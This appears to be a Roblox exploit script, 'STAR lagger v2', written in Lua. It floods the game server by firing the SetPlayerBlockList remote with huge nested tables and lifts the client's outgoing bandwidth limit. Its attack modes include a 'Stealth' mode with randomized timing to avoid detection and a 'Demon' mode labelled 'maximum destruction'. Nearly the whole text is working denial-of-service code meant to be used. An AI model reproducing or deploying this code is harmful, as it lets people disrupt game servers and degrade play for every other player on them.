STAR lagger v2
repeat task.wait() until game:IsLoaded()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local LP = Players.LocalPlayer
local CONFIG_FILE = "STARLaggerV2.json"
local State = {
    enabled = false,
    keybind = Enum.KeyCode.V,
    mode = "Normal", -- Normal, Pulse, Burst, Stealth, Demon
    intensity = 270,
    savedPos = nil,
    stats = { packets = 0, startTime = 0 },
    guiVisible = true,
}
local Modes = {
    Normal = { name = "Normal", desc = "Stable lag", base = 270, wait = 0.22, jitter = 0 },
    Pulse = { name = "Pulse", desc = "Rhythmic spikes", base = 350, wait = 0.15, pulse = true },
    Burst = { name = "Burst", desc = "Short intense bursts", base = 400, wait = 0.08, burst = true },
    Stealth = { name = "Stealth", desc = "Randomized timing", base = 250, wait = 0.3, stealth = true },
    Demon = { name = "Demon", desc = "Maximum destruction", base = 500, wait = 0.02, demon = true },
}
local SaveSys = { dirty = false, pending = nil, lastJson = "" }
local function buildConfig()
    return {
        enabled = State.enabled,
        keybind = State.keybind.Name,
        mode = State.mode,
        intensity = State.intensity,
        guiPosition = mainFrame and { X = mainFrame.Position.X.Offset, Y = mainFrame.Position.Y.Offset } or State.savedPos,
    }
end
local function saveConfig()
    SaveSys.dirty = true
    if SaveSys.pending then task.cancel(SaveSys.pending) end
    SaveSys.pending = task.delay(0.35, function()
        SaveSys.pending = nil
        if not SaveSys.dirty then return end
        SaveSys.dirty = false
        local ok, data = pcall(buildConfig)
        if not ok then return end
        local ok2, json = pcall(HttpService.JSONEncode, HttpService, data)
        if not ok2 or json == SaveSys.lastJson then return end
        SaveSys.lastJson = json
        pcall(function() writefile(CONFIG_FILE, json) end)
    end)
end
local function loadConfig()
    local has = false
    pcall(function() has = isfile(CONFIG_FILE) end)
    if not has then return end
    local raw
    pcall(function() raw = readfile(CONFIG_FILE) end)
    if not raw then return end
    local ok, cfg = pcall(function() return HttpService:JSONDecode(raw) end)
    if not ok or type(cfg) ~= "table" then return end
    if cfg.keybind and Enum.KeyCode[cfg.keybind] then State.keybind = Enum.KeyCode[cfg.keybind] end
    if cfg.mode and Modes[cfg.mode] then State.mode = cfg.mode end
    if cfg.intensity then State.intensity = math.clamp(cfg.intensity, 100, 1000) end
    if cfg.guiPosition and type(cfg.guiPosition) == "table" then State.savedPos = cfg.guiPosition end
end
loadConfig()
local Lagger = {
    thread = nil,
    remote = nil,
    lastPacket = 0,
    packetCount = 0,
    isRunning = false,
}
local function findRemote()
    if Lagger.remote then return Lagger.remote end
    local rs = game:FindFirstChild("RobloxReplicatedStorage") or game:GetService("RobloxReplicatedStorage")
    Lagger.remote = rs and rs:FindFirstChild("SetPlayerBlockList")
    return Lagger.remote
end
local function smartBomb(amount, modeData)
    local remote = findRemote()
    if not remote then return end
    -- Adaptive table size based on server response
    local adaptiveAmount = amount
    if State.packetCount > 50 then
        adaptiveAmount = math.floor(amount * 0.8) -- Reduce if too many packets
    elseif State.packetCount < 10 then
        adaptiveAmount = math.floor(amount * 1.2) -- Increase if too few
    end
    -- Build nested table structure
    local main, spam = {}, {{}}
    local z = spam[1]
    -- Progressive yielding based on intensity
    local yieldEvery = modeData.demon and 25 or (modeData.burst and 35 or 50)
    for i = 1, adaptiveAmount do
        local t = {}
        table.insert(z, t)
        z = t
        if i % yieldEvery == 0 then task.wait() end
    end
    -- Calculate max entries with safety cap
    local maxEntries = math.min(499999 / (adaptiveAmount + 2), modeData.demon and 3000 or 2000)
    -- Batch insert with yielding
    local batchSize = modeData.demon and 250 or 500
    for i = 1, maxEntries do
        table.insert(main, spam)
        if i % batchSize == 0 then task.wait() end
    end
    -- Fire with error handling
    local success = pcall(function()
        if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
            remote:FireServer(main)
        elseif remote:IsA("RemoteFunction") then
            remote:InvokeServer(main)
        end
    end)
    if success then
        State.stats.packets = State.stats.packets + 1
        Lagger.packetCount = Lagger.packetCount + 1
    end
    -- Cleanup memory
    main = nil
    spam = nil
    collectgarbage("step", 1)
end
local function getPulseDelay(baseDelay)
    local phase = (tick() % 2) / 2 -- 0 to 1 over 2 seconds
    local multiplier = 0.5 + (math.sin(phase * math.pi * 2) * 0.5) -- Oscillate 0.5 to 1.5
    return baseDelay * multiplier
end
local function getBurstDelay(baseDelay, burstState)
    if burstState.active then
        burstState.ticks = burstState.ticks - 1
        if burstState.ticks <= 0 then
            burstState.active = false
            burstState.cooldown = math.random(8, 15)
        end
        return baseDelay * 0.3 -- Fast during burst
    else
        burstState.cooldown = burstState.cooldown - 1
        if burstState.cooldown <= 0 then
            burstState.active = true
            burstState.ticks = math.random(5, 12)
        end
        return baseDelay * 2.5 -- Slow during cooldown
    end
end
local function getStealthDelay(baseDelay)
    -- Random variation آ±40%
    local variation = 1 + (math.random(-40, 40) / 100)
    -- Occasional longer pause
    if math.random(1, 20) == 1 then
        variation = variation * 3
    end
    return baseDelay * variation
end
local function startLagger()
    if Lagger.isRunning then return end
    Lagger.isRunning = true
    State.enabled = true
    State.stats.startTime = tick()
    State.stats.packets = 0
    Lagger.packetCount = 0
    local modeData = Modes[State.mode]
    local burstState = { active = false, ticks = 0, cooldown = 0 }
    Lagger.thread = task.spawn(function()
        while Lagger.isRunning do
            -- Set network limit
            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
            -- Calculate dynamic delay based on mode
            local delay = modeData.wait
            if modeData.pulse then
                delay = getPulseDelay(modeData.wait)
            elseif modeData.burst then
                delay = getBurstDelay(modeData.wait, burstState)
            elseif modeData.stealth then
                delay = getStealthDelay(modeData.wait)
            elseif modeData.demon then
                delay = modeData.wait + (math.random(-5, 5) / 1000) -- Micro jitter
            end
            -- Fire bomb
            task.spawn(function()
                smartBomb(State.intensity, modeData)
            end)
            -- Dynamic wait with frame sync
            task.wait(delay)
        end
    end)
end
local function stopLagger()
    Lagger.isRunning = false
    State.enabled = false
    if Lagger.thread then
        task.cancel(Lagger.thread)
        Lagger.thread = nil
    end
    Lagger.packetCount = 0
end
local function toggleLagger()
    if Lagger.isRunning then
        stopLagger()
    else
        startLagger()
    end
    return Lagger.isRunning
end
